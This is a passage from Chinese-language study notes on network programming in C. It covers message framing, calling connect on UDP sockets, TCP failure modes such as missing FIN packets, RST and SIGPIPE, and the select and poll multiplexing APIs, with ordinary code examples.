id="报文读取和解析">报文读取和解析</h4><ul><li><p>报文格式实际上定义了字节的组织形式，发送端和接收端都按照统一的报文格式进行数据传输和解析，常见的报文格式有两种方法：一种是发送端把报文长度预先通过报文告知给接收端；另一种是通过一些特殊的字符来进行边界的划分</p></li><li><p>显式编码报文长度</p></li><li><p>特殊字符作为边界：以 HTTP 为例，通过设置回车符、换行符做为 HTTP 报文协议的边界</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220521-http-message.png" alt=""></p></li></ul><p>​</p><p>​</p><h3 id="UDP-Connect">UDP Connect</h3><h4 id="引例">引例</h4><ul><li><p>客户端在 UDP 套接字上调用 connect 函数，之后将标准输入的字符串发送到服务器端，并从服务器端接收处理后的报文，发送和接收报文调用函数 sendto 和 recvfrom</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"lib/common.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">define</span>    <span class="token expression">MAXLINE     <span class="token number">4096</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: udpclient1 &lt;IPaddress&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 创建了 UDP 套接字</span>    <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> server_addr<span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>    server_addr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span>SERV_PORT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">inet_pton</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>        socklen_t server_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>server_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 将套接字和 IPv4 地址进行“绑定”，可能更好选择是 setpeername</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> server_len<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"connect failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span>reply_addr<span class="token punctuation">;</span>    reply_addr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">,</span> recv_line<span class="token punctuation">[</span>MAXLINE <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    socklen_t len<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            send_line<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending %s\n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        size_t rt <span class="token operator">=</span> <span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> server_len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>rt <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"sendto failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"send bytes: %zu \n"</span><span class="token punctuation">,</span> rt<span class="token punctuation">)</span><span class="token punctuation">;</span>                len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        recv_line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        n <span class="token operator">=</span> <span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> recv_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> reply_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"recvfrom failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        recv_line<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span>recv_line<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实验：不开启服务端的情况下开启客户端</p><p><img src="20220517-171430001.png" alt=""></p></li><li><p>一般来说，服务器端不会主动发起 connect 操作，因为一旦如此，服务器端就只能响应一个客户端，不过，有时候也不排除这样的情形</p></li></ul><p>​</p><p>​</p><h4 id="UDP-Connect-作用">UDP Connect 作用</h4><ul><li>对 UDP 套接字进行 connect 操作主要是为了让应用程序能够接收<strong>异步错误</strong>的信息</li><li>UDP 连接套接字不是发起连接请求的过程，而是记录<strong>目的地址和端口</strong>到套接字的<strong>映射关系</strong>，断开套接字则相反，将删除原来记录的映射关系</li><li>在服务器端不开启的情况下，不调用 connect 的客户端程序，是不会报错的，程序只会阻塞在 recvfrom 上，等待返回（或者超时）</li><li>如果调用 connect 将套接字建立了“上下文”，内核建立了 UDP 套接字 - 目的地址/端口之间的映射关系，当收到一个 ICMP 不可达报文时，内核可以从映射表中找出拥有该目的地址和端口的 UDP 套接字，当该套接字上再次调用 recvfrom 或 recv 时就可收到操作系统内核返回的 <code>Connection Refused</code> 信息</li><li>UDP 套接字允许多次 connect 操作<ul><li>可以重新指定新的 IP 地址和端口号</li><li>可以断开一个已连接的套接字，为了断开一个已连接的 UDP 套接字，第二次调用 connect 时，调用方需要把套接字地址结构的地址族成员设置为 <code>AF_UNSPEC</code></li></ul></li></ul><p>​</p><p>​</p><h4 id="收发函数">收发函数</h4><ul><li><p>在对 UDP 进行 connect 后收发函数的使用，很多书籍是这样推荐的：</p><ul><li><p>使用 send 或 write 函数来发送，如果使用 sendto 需要把相关的 to 地址信息置零</p></li><li><p>使用 recv 或 read 函数来接收，如果使用 recvfrom 需要把对应的 from 地址信息置零</p></li></ul></li><li><p>不同的 UNIX 实现对此表现出来的行为不尽相同</p><ul><li><p>在 Linux 4.4.0 环境中，使用 sendto 和 recvfrom，系统会自动忽略 to 和 from 信息</p></li><li><p>在 macOS 10.13 环境中，确实需要遵守这样的规定，使用 sendto 或 recvfrom 会得到一些奇怪的结果</p></li></ul></li></ul><p>​</p><p>​</p><h4 id="性能考虑">性能考虑</h4><ul><li><p>一般来说，客户端通过 connect 绑定服务端的地址和端口可以有一定程度的性能提升，因为连接套接字需要一定的开销</p><ul><li><p>如果不使用 connect 方式，每次发送报文的过程：连接套接字→发送报文→断开套接字→连接套接字→发送报文→断开套接字 →………</p></li><li><p>如果使用 connect 方式，每次发送报文的过程：连接套接字→发送报文→发送报文→……→断开套接字</p></li></ul></li></ul><p>​</p><p>​</p><h3 id="TCP-Failure-Modes">TCP Failure Modes</h3><ul><li><p>TCP 协议<strong>反映链路异常的能力偏弱</strong>，发送端并无法获取对应数据流的 ACK 情况，接收端也没有办法保证 ACK 过的数据部分可以被应用程序处理</p></li><li><p>TCP 连接建立之后，能感知 TCP 链路的方式是有限的，一种是以 read 为核心的读操作，另一种是以 write 为核心的写操作</p></li><li><p>故障模式总结</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220521-breakdown.png" alt=""></p><ul><li>对端无 FIN 包，需要通过巡检或超时来发现</li><li>对端有 FIN 包，需要通过增强 read 或 write 操作的异常处理</li></ul></li></ul><h4 id="对端无-FIN-包">对端无 FIN 包</h4><ul><li><p><strong>网络中断</strong>造成的对端无 FIN 包</p><ul><li><p>网络中断情况下 TCP 程序并不能及时感知到异常信息，除非网络中的其他设备，如路由器发出 ICMP 报文说明目的网络或主机不可达，如果程序是阻塞在 read 调用上则无法从异常中恢复</p><ul><li><p>可以通过给 read 操作设置超时来解决</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">timeval</span> tv<span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 设置套接字的读操作超时</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> SOL_SOCKET<span class="token punctuation">,</span> SO_RCVTIMEO<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>tv<span class="token punctuation">,</span> <span class="token keyword">sizeof</span> tv<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> nBytes <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">==</span> EAGAIN <span class="token operator">||</span> errno <span class="token operator">==</span> EWOULDBLOCK<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read timeout\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">onClientTimeout</span><span class="token punctuation">(</span>connfd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"error read message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"client closed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>可以添加对连接是否正常的<a href="#%E6%A3%80%E6%B5%8B%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81">检测</a>，如果连接不正常就从当前 read 阻塞中返回并处理</p></li><li><p>利用多路复用技术自带的超时来完成对套接字 I/O 的检查，如果超过了预设的时间就进入异常处理</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">timeval</span> tv<span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_sec <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>tv<span class="token punctuation">.</span>tv_usec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token function">FD_ZERO</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>allreads<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">FD_SET</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>allreads<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    readmask <span class="token operator">=</span> allreads<span class="token punctuation">;</span>    <span class="token comment">// 对套接字进行 I/O 事件的轮询</span>    <span class="token keyword">int</span> rc <span class="token operator">=</span> <span class="token function">select</span><span class="token punctuation">(</span>socket_fd <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>readmask<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"select failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment">// 超时后的处理逻辑</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read timeout\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">onClientTimeout</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>如果先调用 write 发送数据流再阻塞在 read 调用上，Linux 系统的 TCP 协议栈会不断尝试将发送缓冲区的数据发送出去，大概在重传 12 次后协议栈会标识该连接异常，这时，阻塞的 read 调用会返回一条 <code>TIMEOUT</code> 的错误信息</p><ul><li>如果此时程序还往连接写数据，写操作会立即失败，返回一个 SIGPIPE 信号给程序</li></ul></li></ul></li><li><p><strong>系统崩溃</strong>造成的对端无 FIN 包</p><ul><li><p>当系统突然崩溃（如断电），网络连接上来不及发出任何东西，在没有 ICMP 报文的情况下，TCP 程序只能通过 read 和 write 调用得到网络连接异常的信息，超时错误是一个常见的结果</p></li><li><p>系统在崩溃后又重启，当重传的 TCP 分组到达重启后的系统，由于系统中没有该 TCP 分组对应的连接数据，系统会返回一个 RST 重置分节，TCP 程序通过 read 或 write 调用可以分别对 RST 进行错误处理</p><ul><li><p>如果是阻塞的 read 调用，会立即返回一个错误，错误信息为连接重置 <code>Connection Resest</code></p></li><li><p>如果是 write 操作，也会立即失败，应用程序会被返回一个 SIGPIPE 信号</p></li></ul></li></ul></li></ul><p>​</p><p>​</p><h4 id="对端有-FIN-包">对端有 FIN 包</h4><ul><li><p>对端如果有 FIN 包发出，可能的场景是对端调用了 close 或 shutdown 显式地关闭了连接，也可能是对端应用程序崩溃，操作系统内核代为清理所发出的</p></li><li><p><strong>read 直接感知 FIN 包</strong></p><ul><li><p>read 操作在完成正常接收的数据读取之后，FIN 包会通过返回一个 EOF 来完成通知，此时 read 调用返回值为 0</p></li><li><p>收到 FIN 包之后 read 操作不会立即返回</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> nBytes <span class="token operator">=</span> <span class="token function">recv</span><span class="token punctuation">(</span>connfd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"error read message"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nBytes <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"client closed \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>通过 write 产生 RST，read 调用感知 RST</strong></p><ul><li><p>客户端正确显示了服务端的回应之后，再杀死服务器程序，客户端再次输入后出现 <code>peer connection closed</code></p></li><li><p>收到 FIN 包的客户端继续合法地向服务器端发送数据，服务器端在无法定位该 TCP 连接信息的情况下，发送了 RST 信息，当程序调用 read 操作时，内核会将 RST 错误信息通知给应用程序</p></li><li><p>在 Linux 4.4 内核上结果是内核正常将 EOF 信息通知给应用程序，而不是 RST 错误信息；Max OS 10.13.6 上 read 操作可以返回 RST 异常信息</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220526-failure-modes-fin.png" alt=""></p></li></ul></li><li><p><strong>向一个已关闭连接连续写导致 SIGPIPE</strong></p><ul><li><p>客户端在收到 FIN 包之后，没有 read 操作，还是会继续往这个套接字写入数据，当数据到达服务器端时，操作系统内核发现这是一个指向关闭的套接字，发送一个 RST 包给客户端</p><ul><li>因为根据 TCP 协议，连接是双向的，收到对方的 FIN 包只意味着<strong>对方不会再发送任何消息</strong>，在一个双方正常关闭的流程中，收到 FIN 包的一端将剩余数据发送给对面，然后关闭套接字</li></ul></li><li><p>Linux 4.4 内核上，客户端如果再执行 write 操作，会返回一个 RST 错误信息；Max OS 10.13.6 上客户端第二次操作时，应用程序会收到一个 SIGPIPE 信号，如果不捕捉这个信号，应用程序会在毫无征兆的情况下直接退出</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220526-failure-modes-fin-write.png" alt=""></p></li></ul></li></ul><h3 id="IO-多路复用（重点）">IO 多路复用（重点）</h3><ul><li>可以把标准输入、套接字等都看做 I/O 的一路，多路复用就是在任何一路 I/O 有事件发生的情况下，通知应用程序去处理相应的 I/O 事件，在同一时刻仿佛可以处理多个 I/O 事件</li></ul><h4 id="select">select</h4><ul><li><p>一种常见的 I/O 多路复用技术，使用 select 函数通知内核挂起进程，当一个或多个 I/O 事件发生后，控制权返还给应用程序，由应用程序进行 I/O 事件的处理</p></li><li><p>函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token keyword">int</span> maxfd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>readset<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>writeset<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>exceptset<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token operator">*</span>timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token punctuation">{</span>  <span class="token keyword">long</span>   tv_sec<span class="token punctuation">;</span> <span class="token comment">/* seconds */</span>  <span class="token keyword">long</span>   tv_usec<span class="token punctuation">;</span> <span class="token comment">/* microseconds */</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>maxfd</code> 表示待测试的描述符基数，值是待测试的最大描述符 +1（0开始）</li><li>读描述符集合 <code>readset</code>、写描述符集合 <code>writeset</code> 和异常描述符集合 <code>exceptset</code>，这三个描述符集合分别通知内核，在哪些描述符上检测数据可以读，可以写和有异常发生<ul><li>每一个都可以设置成空，表示不需要内核进行相关的检测</li></ul></li><li><code>timeval</code> 结构体时间<ul><li>设置成空 (NULL)，表示如果没有 I/O 事件发生，则 select 一直等待</li><li>设置一个非零的值，表示等待固定的一段时间后从 select 阻塞调用中返回</li><li><code>tv_sec</code> 和 <code>tv_usec</code> 都设置成 0，表示不等待，检测完毕立即返回（使用较少）</li></ul></li><li>返回：若有就绪描述符则为其数目，若超时则为 0，若出错则为 -1</li></ul></li><li><p>设置描述符集合</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FD_ZERO</span><span class="token punctuation">(</span>fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>　　　　　　<span class="token keyword">void</span> <span class="token function">FD_SET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>　　<span class="token keyword">void</span> <span class="token function">FD_CLR</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span>　　　<span class="token keyword">int</span>  <span class="token function">FD_ISSET</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> fd_set <span class="token operator">*</span>fdset<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>FD_ZERO</code> 用来将描述符集合所有元素都设置成 0（0 代表不需要处理，1 代表需要处理）</li><li><code>FD_SET</code> 用来把对应套接字 fd 的元素 a[fd] 设置成 1</li><li><code>FD_CLR</code> 用来把对应套接字 fd 的元素 a[fd] 设置成 0</li><li><code>FD_ISSET</code> 对向量进行检测，判断出对应套接字元素 a[fd] 的值</li></ul></li><li><p>套接字描述符就绪条件</p><ul><li><p>当 select 测试返回，某个套接字准备好可读，使用 read 函数不会阻塞</p><ul><li><p>套接字接收缓冲区有数据可以读，如果使用 read 函数去执行读操作，不会被阻塞</p></li><li><p>对方发送了 FIN，使用 read 函数执行读操作，不会被阻塞，直接返回 0</p></li><li><p>对一个监听套接字而言，有已经完成的连接建立，此时使用 accept 函数去执行不会阻塞，直接返回已经完成的连接</p></li><li><p>套接字有错误待处理，使用 read 函数去执行读操作，不阻塞，且返回 -1。</p></li></ul></li><li><p>select 检测套接字可写，完全是基于套接字本身的特性来说的，使用 write 函数就不会阻塞</p><ul><li><p>套接字发送缓冲区足够大，如果使用非阻塞套接字进行 write 操作，将不会被阻塞，直接返回</p></li><li><p>连接的写半边已经关闭，如果继续进行写操作将会产生 SIGPIPE 信号</p></li><li><p>套接字上有错误待处理，使用 write 函数去执行读操作，不阻塞，且返回 -1</p></li></ul></li></ul></li><li><p>select 缺点是所支持的文件描述符的个数是有限的（1024）</p></li></ul><h4 id="poll">poll</h4><ul><li><p>函数原型</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">poll</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">pollfd</span> <span class="token operator">*</span>fds<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> nfds<span class="token punctuation">,</span> <span class="token keyword">int</span> timeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">pollfd</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span>    fd<span class="token punctuation">;</span>       <span class="token comment">/* file descriptor */</span>    <span class="token keyword">short</span>  events<span class="token punctuation">;</span>   <span class="token comment">/* events to look for */</span>    <span class="token keyword">short</span>  revents<span class="token punctuation">;</span>  <span class="token comment">/* events returned */</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>pollfd 的数组，pollfd 由三个部分组成</li><li>nfds 描述的是数组 fds 的大小（向 poll 申请的事件检测的个数）</li><li>timeout 描述了 poll 的行为<ul><li>&lt;0 表示在有事件发生之前永远等待；</li><li>=0 表示不阻塞进程，立即返回；</li><li>&gt;0 表示 poll 调用方等待指定的毫秒数后返回</li></ul></li></ul></li><li><p>events 类型的事件可以分为可读事件和可写事件；poll 每次检测之后的结果不会修改原来的传入值，而是将结果保留在 revents 字段中，这样就不需要每次检测完都得重置待检测的描述字和感兴趣的事件</p></li><li><p>如果不想对某个 pollfd 结构进行事件检测，可以把它对应的 pollfd 结构的 fd 成员设置成一个负值，这样 poll 函数将忽略这样的 events 